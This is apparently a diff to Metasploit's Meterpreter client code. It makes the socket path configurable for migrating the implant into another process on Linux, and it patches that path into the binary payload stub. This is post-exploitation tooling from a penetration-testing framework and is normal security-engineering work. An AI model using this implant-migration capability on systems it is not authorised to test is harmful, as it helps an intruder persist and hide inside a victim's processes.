@@ -180,7 +180,7 @@ class ClientCore < Extension
   # Migrates the meterpreter instance to the process specified
   # by pid.  The connection to the server remains established.
   #
-  def migrate( pid )
+  def migrate(pid, socket_path="/tmp/meterpreter.sock")
     keepalive = client.send_keepalives
     client.send_keepalives = false
     process       = nil
@@ -204,8 +204,9 @@ class ClientCore < Extension
       raise RuntimeError, "Cannot migrate into non existent process", caller
     end
 
-    # We cant migrate into a process that we are unable to open
-    if process['arch'].nil? or process['arch'].empty?
+    # We can't migrate into a process that we are unable to open
+    # On linux, arch is empty even if we can access the process
+    if client.platform =~ /win/ && (process['arch'] == nil || process['arch'].empty?)
       raise RuntimeError, "Cannot migrate into this process (insufficient privileges)", caller
     end
 
@@ -214,7 +215,21 @@ class ClientCore < Extension
       raise RuntimeError, "Cannot migrate into current process", caller
     end
 
-    blob = generate_payload_stub(client, process)
+    if client.platform =~ /linux/
+      if socket_path.blank?
+        socket_path = "/tmp/meterpreter.sock"
+      end
+
+      socket_dir = ::File.dirname(socket_path)
+      stat_dir = client.fs.filestat.new(socket_dir)
+
+      unless stat_dir.directory?
+        raise RuntimeError, "Directory #{socket_dir} not found", caller
+      end
+      # Rex::Post::FileStat#writable? isn't available
+    end
+
+    blob = generate_payload_stub(client, process, socket_path)
 
     # Build the migration request
     request = Packet.create_request( 'core_migrate' )
@@ -231,7 +246,7 @@ class ClientCore < Extension
       ep = elf_ep(blob)
       request.add_tlv(TLV_TYPE_MIGRATE_BASE_ADDR, 0x20040000)
       request.add_tlv(TLV_TYPE_MIGRATE_ENTRY_POINT, ep)
-      request.add_tlv(TLV_TYPE_MIGRATE_SOCKET_PATH, "/tmp/meterpreter.secret", false, client.capabilities[:zlib])
+      request.add_tlv(TLV_TYPE_MIGRATE_SOCKET_PATH, socket_path, false, client.capabilities[:zlib])
     end
 
     # Send the migration request (bump up the timeout to 60 seconds)
@@ -329,12 +344,12 @@ class ClientCore < Extension
 
   private
 
-  def generate_payload_stub(client, process)
+  def generate_payload_stub(client, process, socket_path)
     case client.platform
     when /win/i
       blob = generate_windows_stub(client, process)
     when /linux/i
-      blob = generate_linux_stub("/tmp/meterpreter.secret")
+      blob = generate_linux_stub(socket_path)
     else
       raise RuntimeError, "Unsupported platform '#{client.platform}'"
     end
@@ -391,12 +406,16 @@ class ClientCore < Extension
   end
 
   def generate_linux_stub(socket_path)
+    pos = nil
     file = ::File.join(Msf::Config.data_directory, "meterpreter", "msflinker_linux_x86.bin")
     blob = ::File.open(file, "rb") {|f|
       f.read(f.stat.size)
     }
 
-    pos = blob.index("/tmp/meterpreter.sock")
+    unless socket_path.blank?
+      pos = blob.index("/tmp/meterpreter.sock")
+    end
+
     unless pos.nil?
       blob[pos, socket_path.length + 1] = socket_path + "\x00"
     end
